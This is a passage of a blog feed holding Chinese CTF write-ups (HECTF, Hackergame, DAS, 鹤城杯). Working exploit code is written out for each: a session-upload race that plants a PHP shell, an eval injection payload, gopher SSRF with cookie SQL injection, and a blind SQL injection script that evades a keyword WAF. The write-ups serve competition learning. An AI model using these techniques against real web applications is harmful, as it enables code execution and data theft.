    <summary type="html">&lt;h2 id=&quot;temp&quot;&gt;&lt;a href=&quot;#temp&quot; class=&quot;headerlink&quot; title=&quot;temp&quot;&gt;&lt;/a&gt;temp&lt;/h2&gt;&lt;p&gt;这道不是极客大挑战的，就写这里吧&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;hljs php&quot;&gt;&amp;lt;html&amp;gt;
</summary>
      
    
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/categories/CTF/"/>
    
    <category term="wp" scheme="http://lll-nnn.github.io/categories/CTF/wp/"/>
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/tags/CTF/"/>
    
    <category term="WP" scheme="http://lll-nnn.github.io/tags/WP/"/>
    
    <category term="geekchallenge" scheme="http://lll-nnn.github.io/tags/geekchallenge/"/>
    
  </entry>
  
  <entry>
    <title>HECTF</title>
    <link href="http://lll-nnn.github.io/2021/11/16/HECTF/"/>
    <id>http://lll-nnn.github.io/2021/11/16/HECTF/</id>
    <published>2021-11-16T15:38:01.000Z</published>
    <updated>2021-11-16T15:48:35.596Z</updated>
    
    <content type="html"><![CDATA[<h2 id="LFI-to-RCE"><a href="#LFI-to-RCE" class="headerlink" title="LFI_to_RCE"></a>LFI_to_RCE</h2><p>题目：</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>    show_source(<span class="hljs-string">&#x27;./index.php&#x27;</span>);    <span class="hljs-keyword">include</span> $_GET[<span class="hljs-string">&#x27;file&#x27;</span>];<span class="hljs-meta">?&gt;</span></code></pre><p>session文件包含，写入shell到session文件</p><p>poc</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> threading<span class="hljs-keyword">import</span> requests<span class="hljs-keyword">from</span> concurrent.futures <span class="hljs-keyword">import</span> ThreadPoolExecutor, waittarget = <span class="hljs-string">&#x27;http://81.70.102.209:10040/index.php&#x27;</span>session = requests.session()flag = <span class="hljs-string">&#x27;aaaa&#x27;</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">upload</span>(<span class="hljs-params">e: threading.Event</span>):</span>    files = [        (<span class="hljs-string">&#x27;value&#x27;</span>, (<span class="hljs-string">&#x27;load.png&#x27;</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">40960</span>, <span class="hljs-string">&#x27;image/png&#x27;</span>)),    ]    data = &#123;<span class="hljs-string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="hljs-string">rf&#x27;&#x27;&#x27;&lt;?php file_put_contents(&#x27;/tmp/success&#x27;, &#x27;&lt;?=system(&quot;cat /f1aggggggggggggggggggggggg&quot;);?&gt;&#x27;); echo(&#x27;<span class="hljs-subst">&#123;flag&#125;</span>&#x27;); ?&gt;&#x27;&#x27;&#x27;</span>&#125;    <span class="hljs-comment">#data = &#123;&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;: rf&#x27;&#x27;&#x27;&lt;?php file_put_contents(&#x27;/tmp/success&#x27;, &#x27;&lt;?=system(&quot;ls /&quot;);?&gt;&#x27;); ?&gt;&#x27;&#x27;&#x27;&#125;</span>    <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> e.is_set():        requests.post(            target,            data=data,            files=files,            cookies=&#123;<span class="hljs-string">&#x27;PHPSESSID&#x27;</span>: flag&#125;,        )<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">write</span>(<span class="hljs-params">e: threading.Event</span>):</span>    <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> e.is_set():        response = requests.get(            <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;target&#125;</span>?file=/tmp/sess_<span class="hljs-subst">&#123;flag&#125;</span>&#x27;</span>,        )        <span class="hljs-keyword">if</span> flag.encode() <span class="hljs-keyword">in</span> response.content:            e.<span class="hljs-built_in">set</span>()<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:    futures = []    event = threading.Event()    pool = ThreadPoolExecutor(<span class="hljs-number">15</span>)    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):        futures.append(pool.submit(upload, event))    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):        futures.append(pool.submit(write, event))    wait(futures)</code></pre><p>访问<code>http://81.70.102.209:10040/?file=/tmp/success</code>得到flag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;LFI-to-RCE&quot;&gt;&lt;a href=&quot;#LFI-to-RCE&quot; class=&quot;headerlink&quot; title=&quot;LFI_to_RCE&quot;&gt;&lt;/a&gt;LFI_to_RCE&lt;/h2&gt;&lt;p&gt;题目：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;hljs php&quot;&gt;&lt;s</summary>
      
    
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/categories/CTF/"/>
    
    <category term="php" scheme="http://lll-nnn.github.io/categories/CTF/php/"/>
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/tags/CTF/"/>
    
    <category term="WP" scheme="http://lll-nnn.github.io/tags/WP/"/>
    
    <category term="php" scheme="http://lll-nnn.github.io/tags/php/"/>
    
    <category term="session文件包含写shell" scheme="http://lll-nnn.github.io/tags/session%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%86%99shell/"/>
    
  </entry>
  
  <entry>
    <title>Hackergame2021</title>
    <link href="http://lll-nnn.github.io/2021/11/07/hackergame2021/"/>
    <id>http://lll-nnn.github.io/2021/11/07/hackergame2021/</id>
    <published>2021-11-07T07:12:15.000Z</published>
    <updated>2021-11-07T07:58:05.505Z</updated>
    
    <content type="html"><![CDATA[<h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p><img src="https://i.bmp.ovh/imgs/2021/11/da0556cc3a06f8bc.png"></p><p><code>unix时间戳</code><br>点next后url会加上<code>page=1</code>,时间就会加一秒</p><p>时间戳网站<code>https://tool.chinaz.com/tools/unixtime.aspx</code></p><p>也可以用二分法</p><pre><code>测试 100000000000，太大 =&gt; (100000000000 + 0) / 2 = 50000000000测试 50000000000，太大 =&gt; (50000000000 + 0) / 2 = 25000000000测试 25000000000，太大 =&gt; (25000000000 + 0) / 2 = 12500000000测试 12500000000，太大 =&gt; (12500000000 + 0) / 2 = 6250000000测试 6250000000，太大 =&gt; (6250000000 + 0) / 2 = 3125000000测试 3125000000，太大 =&gt; (3125000000 + 0) / 2 = 1562500000测试 1562500000，太小（2019 年）=&gt; (1562500000 + 3125000000) / 2 = 2343750000测试 2343750000，太大 =&gt; (1562500000 + 2343750000) / 2 = 1953125000测试 1953125000，太大 =&gt; (1562500000 + 1953125000) / 2 = 1757812500测试 1757812500，太大（2025 年）=&gt; (1562500000 + 1757812500) / 2 = 1660156250测试 1660156250，太大（2022 年）=&gt; (1562500000 + 1660156250) / 2 = 1611328125测试 1611328125，太小（2021 年 1 月）=&gt; (1611328125 + 1660156250) / 2 = 1635742187测试 1635742187，太大（2021 年 11 月）=&gt; (1611328125 + 1635742187) / 2 = 1623535156测试 1623535156，太小（2021 年 6 月）=&gt; (1623535156 + 1635742187) / 2 = 1629638671测试 1629638671，太小（2021 年 8 月）=&gt; (1629638671 + 1635742187) / 2 = 1632690429测试 1632690429，太小（2021 年 9 月）=&gt; (1632690429 + 1635742187) / 2 = 1634216308测试 1634216308，太小（2021 年 10 月 14 日）=&gt; (1634216308 + 1635742187) / 2 = 16349792471634979247 得到答案（2021-10-23 16:54:07 +08:00）</code></pre><h2 id="卖瓜"><a href="#卖瓜" class="headerlink" title="卖瓜"></a>卖瓜</h2><p><img src="https://i.bmp.ovh/imgs/2021/11/8d62245630118b5c.png"><br>显然，69是组合不出20的</p><p>需要猜测源码，<code>intval</code></p><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">action</span>(<span class="hljs-params"></span>)</span><span class="hljs-function"></span>&#123;    check_last_action();    $bottle_6 = intval($_POST[<span class="hljs-string">&#x27;b6&#x27;</span>]);    $bottle_9 = intval($_POST[<span class="hljs-string">&#x27;b9&#x27;</span>]);    <span class="hljs-keyword">if</span> ($bottle_6 &lt; <span class="hljs-number">0</span> || $bottle_9 &lt; <span class="hljs-number">0</span>) &#123;        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;操作无效：不能放负数个瓜。点击&lt;a href=&quot;/&quot;&gt;这里&lt;/a&gt;回到主页。&#x27;</span>);    &#125;    $_SESSION[<span class="hljs-string">&#x27;pool&#x27;</span>] += intval($bottle_6 * <span class="hljs-number">6</span> + $bottle_9 * <span class="hljs-number">9</span>);    header(<span class="hljs-string">&#x27;Location: /&#x27;</span>);&#125;</code></pre><p><code>整数溢出会变为float,然后再用intval后，就会变成负数</code></p><pre><code class="hljs php"><span class="hljs-keyword">echo</span> PHP_INT_MAX;   <span class="hljs-comment">//9223372036854775807</span>$a=<span class="hljs-number">9223372036854775807</span>;$b=<span class="hljs-number">9223372036854775808</span>;$ia=intval($a);$ib=intval($b);var_dump($a);   <span class="hljs-comment">//int(9223372036854775807)</span>var_dump($b);   <span class="hljs-comment">//float(9.2233720368548E+18)</span>var_dump($ia);  <span class="hljs-comment">// int(9223372036854775807)</span>var_dump($ib);  <span class="hljs-comment">//int(-9223372036854775808)</span></code></pre><pre><code>1024819115206086200 * 9 = 92233720368547758001024819115206086201 * 9 = 9223372036854775809</code></pre><pre><code class="hljs php">$b = <span class="hljs-number">1024819115206086201</span> * <span class="hljs-number">9</span>;$ib = intval($b); <span class="hljs-comment">// int(-9223372036854775808)</span>$b = <span class="hljs-number">1024819115206086200</span> * <span class="hljs-number">9</span>;$ib += intval($b); <span class="hljs-comment">// int(-8)</span>$b = <span class="hljs-number">1</span> * <span class="hljs-number">9</span>;$ib += intval($b); <span class="hljs-comment">// int(1)</span>$b = <span class="hljs-number">1024819115206086201</span> * <span class="hljs-number">9</span>;$ib += intval($b); <span class="hljs-comment">// int(-9223372036854775807)</span>$b = <span class="hljs-number">1024819115206086200</span> * <span class="hljs-number">9</span>;$ib += intval($b); <span class="hljs-comment">// int(-7)</span>$b = <span class="hljs-number">3</span> * <span class="hljs-number">9</span>;$ib += intval($b); <span class="hljs-comment">// int(20)</span></code></pre><p>操作六次</p><pre><code>1024819115206086201 * 91024819115206086200 * 91 * 91024819115206086201 * 91024819115206086200 * 93 * 9</code></pre><p>其他两道<br>一道GraphQL，还有一道js逆向分析，不懂<br><a href="https://github.com/USTC-Hackergame/hackergame2021-writeups">https://github.com/USTC-Hackergame/hackergame2021-writeups</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;签到&quot;&gt;&lt;a href=&quot;#签到&quot; class=&quot;headerlink&quot; title=&quot;签到&quot;&gt;&lt;/a&gt;签到&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;https://i.bmp.ovh/imgs/2021/11/da0556cc3a06f8bc.png&quot;&gt;&lt;/p&gt;
&lt;p</summary>
      
    
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/categories/CTF/"/>
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/tags/CTF/"/>
    
    <category term="WP" scheme="http://lll-nnn.github.io/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>DAS X 吉林工师</title>
    <link href="http://lll-nnn.github.io/2021/10/29/DAS/"/>
    <id>http://lll-nnn.github.io/2021/10/29/DAS/</id>
    <published>2021-10-29T15:25:09.000Z</published>
    <updated>2021-11-07T07:57:11.927Z</updated>
    
    <content type="html"><![CDATA[<h2 id="迷路的魔法少女"><a href="#迷路的魔法少女" class="headerlink" title="迷路的魔法少女"></a>迷路的魔法少女</h2><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>highlight_file(<span class="hljs-string">&#x27;index.php&#x27;</span>);extract($_GET);error_reporting(<span class="hljs-number">0</span>);<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">String2Array</span>(<span class="hljs-params">$data</span>)</span><span class="hljs-function"></span>&#123;    <span class="hljs-keyword">if</span>($data == <span class="hljs-string">&#x27;&#x27;</span>) <span class="hljs-keyword">return</span> <span class="hljs-keyword">array</span>();    @<span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;\$array = <span class="hljs-subst">$data</span>;&quot;</span>);    <span class="hljs-keyword">return</span> $array;&#125;<span class="hljs-keyword">if</span>(is_array($attrid) &amp;&amp; is_array($attrvalue))&#123;        $attrstr .= <span class="hljs-string">&#x27;array(&#x27;</span>;        $attrids = count($attrid);        <span class="hljs-keyword">for</span>($i=<span class="hljs-number">0</span>; $i&lt;$attrids; $i++)        &#123;            $attrstr .= <span class="hljs-string">&#x27;&quot;&#x27;</span>.intval($attrid[$i]).<span class="hljs-string">&#x27;&quot;=&gt;&#x27;</span>.<span class="hljs-string">&#x27;&quot;&#x27;</span>.$attrvalue[$i].<span class="hljs-string">&#x27;&quot;&#x27;</span>;            <span class="hljs-keyword">if</span>($i &lt; $attrids<span class="hljs-number">-1</span>)            &#123;                $attrstr .= <span class="hljs-string">&#x27;,&#x27;</span>;            &#125;        &#125;        $attrstr .= <span class="hljs-string">&#x27;);&#x27;</span>;&#125;String2Array($attrstr);</code></pre><p>突破点在<code>attrvalue</code>上</p><p>payload：<code>?attrid[]=&amp;attrvalue[]=1&quot;,11=&gt;phpinfo(),&quot;11&quot;=&gt;&quot;2</code></p><p>flag在<code>phpinfo()</code>中</p><p>通过闭合双引号让<code>eval</code>执行命令</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;迷路的魔法少女&quot;&gt;&lt;a href=&quot;#迷路的魔法少女&quot; class=&quot;headerlink&quot; title=&quot;迷路的魔法少女&quot;&gt;&lt;/a&gt;迷路的魔法少女&lt;/h2&gt;&lt;pre&gt;&lt;code class=&quot;hljs php&quot;&gt;&lt;span class=&quot;hljs-meta&quot;&gt;&amp;</summary>
      
    
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/categories/CTF/"/>
    
    <category term="php" scheme="http://lll-nnn.github.io/categories/CTF/php/"/>
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/tags/CTF/"/>
    
    <category term="WP" scheme="http://lll-nnn.github.io/tags/WP/"/>
    
    <category term="php" scheme="http://lll-nnn.github.io/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>鹤城杯</title>
    <link href="http://lll-nnn.github.io/2021/10/10/%E9%B9%A4%E5%9F%8E%E6%9D%AF/"/>
    <id>http://lll-nnn.github.io/2021/10/10/%E9%B9%A4%E5%9F%8E%E6%9D%AF/</id>
    <published>2021-10-10T09:17:20.000Z</published>
    <updated>2021-10-17T08:41:08.758Z</updated>
    
    <content type="html"><![CDATA[<h2 id="middle-magic"><a href="#middle-magic" class="headerlink" title="middle_magic"></a>middle_magic</h2><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>    highlight_file(<span class="hljs-keyword">__FILE__</span>);    <span class="hljs-keyword">include</span> <span class="hljs-string">&quot;./flag.php&quot;</span>;    <span class="hljs-keyword">include</span> <span class="hljs-string">&quot;./result.php&quot;</span>;    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;aaa&#x27;</span>]) &amp;&amp; strlen($_GET[<span class="hljs-string">&#x27;aaa&#x27;</span>]) &lt; <span class="hljs-number">20</span>)&#123;        $aaa = preg_replace(<span class="hljs-string">&#x27;/^(.*)level(.*)$/&#x27;</span>, <span class="hljs-string">&#x27;$&#123;1&#125;&lt;!-- filtered --&gt;$&#123;2&#125;&#x27;</span>, $_GET[<span class="hljs-string">&#x27;aaa&#x27;</span>]);        <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/pass_the_level_1#/&#x27;</span>, $aaa))&#123;            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;here is level 2&quot;</span>;                        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;admin&#x27;</span>]) <span class="hljs-keyword">and</span> <span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;root_pwd&#x27;</span>])) &#123;                <span class="hljs-keyword">if</span> ($_POST[<span class="hljs-string">&#x27;admin&#x27;</span>] == $_POST[<span class="hljs-string">&#x27;root_pwd&#x27;</span>])                    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;p&gt;The level 2 can not pass!&lt;/p&gt;&#x27;</span>;            <span class="hljs-comment">// START FORM PROCESSING    </span>                <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (sha1($_POST[<span class="hljs-string">&#x27;admin&#x27;</span>]) === sha1($_POST[<span class="hljs-string">&#x27;root_pwd&#x27;</span>]))&#123;                    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;here is level 3,do you kown how to overcome it?&quot;</span>;                    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;level_3&#x27;</span>])) &#123;                        $level_3 = json_decode($_POST[<span class="hljs-string">&#x27;level_3&#x27;</span>]);                                                <span class="hljs-keyword">if</span> ($level_3-&gt;result == $result) &#123;                                                        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;success:&quot;</span>.$flag;                        &#125;                        <span class="hljs-keyword">else</span> &#123;                            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you never beat me!&quot;</span>;                        &#125;                    &#125;                    <span class="hljs-keyword">else</span>&#123;                        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;out&quot;</span>;                    &#125;                &#125;                <span class="hljs-keyword">else</span>&#123;                                        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no&quot;</span>);                &#125;            <span class="hljs-comment">// perform validations on the form data</span>            &#125;            <span class="hljs-keyword">else</span>&#123;                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;p&gt;out!&lt;/p&gt;&#x27;</span>;            &#125;        &#125;                <span class="hljs-keyword">else</span>&#123;            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;nonono!&#x27;</span>;        &#125;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;hr&gt;&#x27;</span>;    &#125;<span class="hljs-meta">?&gt;</span></code></pre><p>payload:</p><pre><code>?aaa=%0apass_the_level_1%23admin[]=1&amp;root_pwd[]=2&amp;level_3=&#123;&quot;result&quot;:true&#125;</code></pre><h2 id="EasyP"><a href="#EasyP" class="headerlink" title="EasyP"></a>EasyP</h2><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;config.php&#x27;</span>; <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/config\.php\/*$/i&#x27;</span>, $_SERVER[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>])) &#123;  <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;</span>);&#125;<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;source&#x27;</span>])) &#123;  highlight_file(basename($_SERVER[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>]));  <span class="hljs-keyword">exit</span>();&#125;$secret = bin2hex(random_bytes(<span class="hljs-number">64</span>));<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;guess&#x27;</span>])) &#123;  $guess = (<span class="hljs-keyword">string</span>) $_POST[<span class="hljs-string">&#x27;guess&#x27;</span>];  <span class="hljs-keyword">if</span> (hash_equals($secret, $guess)) &#123;    $message = <span class="hljs-string">&#x27;Congratulations! The flag is: &#x27;</span> . FLAG;  &#125; <span class="hljs-keyword">else</span> &#123;    $message = <span class="hljs-string">&#x27;Wrong.&#x27;</span>;  &#125;&#125;<span class="hljs-meta">?&gt;</span>&lt;!doctype html&gt;&lt;html lang=<span class="hljs-string">&quot;en&quot;</span>&gt;  &lt;head&gt;    &lt;meta charset=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;    &lt;title&gt;Can you guess it?&lt;/title&gt;  &lt;/head&gt;  &lt;body&gt;    &lt;h1&gt;Can you guess it?&lt;/h1&gt;    &lt;p&gt;<span class="hljs-keyword">If</span> your guess is correct, I<span class="hljs-string">&#x27;ll give you the flag.&lt;/p&gt;</span><span class="hljs-string">    &lt;p&gt;&lt;a href=&quot;?source&quot;&gt;Source&lt;/a&gt;&lt;/p&gt;</span><span class="hljs-string">    &lt;hr&gt;</span><span class="hljs-string">&lt;?php if (isset($message)) &#123; ?&gt;</span><span class="hljs-string">    &lt;p&gt;&lt;?= $message ?&gt;&lt;/p&gt;</span><span class="hljs-string">&lt;?php &#125; ?&gt;</span><span class="hljs-string">    &lt;form action=&quot;index.php&quot; method=&quot;POST&quot;&gt;</span><span class="hljs-string">      &lt;input type=&quot;text&quot; name=&quot;guess&quot;&gt;</span><span class="hljs-string">      &lt;input type=&quot;submit&quot;&gt;</span><span class="hljs-string">    &lt;/form&gt;</span><span class="hljs-string">  &lt;/body&gt;</span><span class="hljs-string">&lt;/html&gt;</span></code></pre><p>通过<code>highlight_file</code>读取<code>config.php</code><br>但被过了，需要个字符绕过*的匹配</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params">$str</span>)</span>&#123;    <span class="hljs-keyword">return</span> preg_match(<span class="hljs-string">&#x27;/config\.php\/*$/i&#x27;</span>, $str);&#125;<span class="hljs-keyword">for</span> ($i = <span class="hljs-number">0</span>; $i &lt; <span class="hljs-number">255</span>; $i++)&#123;    $s = <span class="hljs-string">&#x27;/index.php/config.php/&#x27;</span>.chr($i);    <span class="hljs-keyword">if</span>(!check($s))&#123;        $t = basename(<span class="hljs-string">&#x27;/index.php/config.php/&#x27;</span>.chr($i));        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;$&#123;i&#125;: $&#123;t&#125;\n&quot;</span>;    &#125;&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>payload:<code>/index.php/config.php/%80?source</code></p><h2 id="easy-sql-1"><a href="#easy-sql-1" class="headerlink" title="easy_sql_1"></a>easy_sql_1</h2><p>进去有个<code>use.php</code>,ssrf，但<code>index.php</code>的表单提交不了，没反应</p><p>要用gopher协议打post<br>然后adminadmin登录后发现给了<br><code>cookie:this_is_your_cookie=YWRtaW4=</code>，把cookie带上</p><p>cookie存在sql注入</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> quotedata=<span class="hljs-string">&quot;&quot;&quot;POST / HTTP/1.1</span><span class="hljs-string">Host: 127.0.0.1:80</span><span class="hljs-string">Content-Type: application/x-www-form-urlencoded</span><span class="hljs-string">Cookie: this_is_your_cookie=LTEnKXx8dXBkYXRleG1sKDEsY29uY2F0KDEsKHNlbGVjdCBncm91cF9jb25jYXQoZmxhZykgZnJvbSBmbGFnKSwxKSwxKSM=;PHPSESSID=susn9dj4f1806v0pl5oiureek1;</span><span class="hljs-string">Content-Length: &#123;&#125;</span><span class="hljs-string"></span><span class="hljs-string">&#123;&#125;</span><span class="hljs-string">&quot;&quot;&quot;</span>payload=<span class="hljs-string">&quot;uname=admin&amp;passwd=admin&quot;</span>length=<span class="hljs-built_in">len</span>(payload)data=data.<span class="hljs-built_in">format</span>(length,payload)data=quote(data,<span class="hljs-string">&#x27;utf-8&#x27;</span>)url=<span class="hljs-string">&quot;http://182.116.62.85:28303/use.php&quot;</span>params=&#123;    <span class="hljs-string">&#x27;url&#x27;</span>:<span class="hljs-string">&quot;gopher://127.0.0.1:80/_&quot;</span>+data&#125;headers=&#123;    <span class="hljs-string">&#x27;Cookie&#x27;</span>:<span class="hljs-string">&quot;PHPSESSID=8t4ppbs8ek3l5v5estgbttqtu3&quot;</span>&#125;r=requests.get(url,params=params,headers=headers)print(r.text)</code></pre><h2 id="easy-sql-2"><a href="#easy-sql-2" class="headerlink" title="easy_sql_2"></a>easy_sql_2</h2><p>WAF:</p><pre><code class="hljs php"><span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&quot;/select|;|creat|like|insert| |sys|drop|union|file|show|rename|handler|alter|sys|if|prepare|execute|tables|delete|where\./i&quot;</span>, $value))&#123;    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;try again!&#x27;</span>);    <span class="hljs-keyword">exit</span>();&#125;</code></pre><p>注库名：</p><pre><code class="hljs sql">(ascii(substr(database(),&#123;i&#125;,1)))=&#123;val&#125;</code></pre><p>tables被过，不能用<code>information_schema.tables</code>;</p><p>mysql8中有<code>mysql.innodb_table_stats</code>和<code>mysql.innodb_index_stats</code>;以此获取表名</p><pre><code class="hljs sql">admin&#x27; and ((&quot;ctf&quot;,&quot;%s&quot;,1,1,1,1,1,1)&lt;(table mysql.innodb_index_stats order by last_update desc limit 5,1))#</code></pre><p>select 被过，用MySQL8的table语句</p><pre><code class="hljs sql">TABLE table_name [ORDER BY column_name] [LIMIT number [OFFSET number]]</code></pre><p>可以把<code>table t</code>简单理解成<code>select * from t</code>，和<code>select</code>的区别在于</p><ul><li><code>table</code>总是显示表的所有列</li><li><code>table</code>不允许任何的行过滤;也就是说，<code>TABLE</code>不支持任何<code>WHERE</code>子句。<br> 可以用来盲注表名</li></ul><pre><code class="hljs sql">admin&#x27; and ((&quot;ctf&quot;,&quot;%s&quot;,1,1,1,1,1,1)&lt;(table mysql.innodb_index_stats order by last_update desc limit 5,1))#</code></pre><p>注数据</p><pre><code class="hljs sql">(ascii(substr(hex((table fl11aag limit 1,1)),&#123;i&#125;,1)))=&#123;val&#125;</code></pre><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<span class="hljs-keyword">import</span> string<span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> sleep<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">strtohex</span>(<span class="hljs-params">s</span>):</span>    ss = <span class="hljs-string">&quot;0x&quot;</span>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> s:        ss +=  <span class="hljs-built_in">str</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(i))).replace(<span class="hljs-string">&quot;0x&quot;</span>,<span class="hljs-string">&#x27;&#x27;</span>)    <span class="hljs-keyword">return</span> ssurl=<span class="hljs-string">&quot;http://182.116.62.85:26571/login.php&quot;</span>flag=<span class="hljs-string">&quot;flag&#123;&quot;</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10000</span>):    <span class="hljs-comment">#for j in &quot;.-0123456789abcdefghijklmnopqrstuvwxyz0123456789&#123;|&#125;~&quot;:</span>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">19</span>,<span class="hljs-number">128</span>):        <span class="hljs-comment">#payload=&quot;-1&#x27;||((&#x27;def&#x27;,&#x27;ctf&#x27;,&#x27;fl11aag&#x27;,&#x27;&#123;&#125;&#x27;,&#x27;&#x27;,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22)&lt;(table/**/information_schema.columns/**/limit/**/3,1))#&quot;.format(flag+j)</span>        payload=<span class="hljs-string">&quot;-1&#x27;||((binary/**/&#123;&#125;)&lt;(table/**/ctf.fl11aag/**/limit/**/1,1))#&quot;</span>.<span class="hljs-built_in">format</span>(strtohex(flag+<span class="hljs-built_in">chr</span>(j)))        data=&#123;            <span class="hljs-string">&quot;username&quot;</span>:payload,            <span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;1&quot;</span>        &#125;        r=requests.post(url=url,data=data)        <span class="hljs-comment">#print(r.text)</span>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;username&quot;</span> <span class="hljs-keyword">in</span> r.text <span class="hljs-keyword">and</span> <span class="hljs-string">&quot;try&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> r.text:            <span class="hljs-comment">#print(r.text)</span>            <span class="hljs-comment">#print(payload)</span>            <span class="hljs-comment">#print(j)</span>            flag+=<span class="hljs-built_in">chr</span>(j<span class="hljs-number">-1</span>)            print(flag)            <span class="hljs-keyword">break</span></code></pre><h2 id="Spring"><a href="#Spring" class="headerlink" title="Spring"></a>Spring</h2><p><a href="http://blog.cyberpeace.cn/Spring-Web-Flow/">http://blog.cyberpeace.cn/Spring-Web-Flow/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;middle-magic&quot;&gt;&lt;a href=&quot;#middle-magic&quot; class=&quot;headerlink&quot; title=&quot;middle_magic&quot;&gt;&lt;/a&gt;middle_magic&lt;/h2&gt;&lt;pre&gt;&lt;code class=&quot;hljs php&quot;&gt;&lt;span</summary>
      
    
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/categories/CTF/"/>
    
    <category term="鹤城杯" scheme="http://lll-nnn.github.io/categories/CTF/%E9%B9%A4%E5%9F%8E%E6%9D%AF/"/>
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/tags/CTF/"/>
    
    <category term="WP" scheme="http://lll-nnn.github.io/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>DownUnderCTF</title>
    <link href="http://lll-nnn.github.io/2021/09/28/DownUnderCTF/"/>
    <id>http://lll-nnn.github.io/2021/09/28/DownUnderCTF/</id>
    <published>2021-09-28T03:24:23.000Z</published>
    <updated>2021-10-10T09:16:43.996Z</updated>
    
